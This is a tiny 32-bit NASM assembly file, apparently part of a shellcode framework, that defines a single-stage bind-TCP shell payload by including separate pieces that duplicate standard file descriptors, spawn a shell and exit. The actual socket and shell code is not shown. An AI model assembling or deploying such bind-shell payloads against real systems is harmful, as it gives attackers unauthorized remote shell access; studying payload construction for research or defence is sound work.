BITS 32

_single_bind_tcp:
begin:	
%include "_dup2_std_fds.s"
%include "_shell.s"
%include "_exit.s"
end:
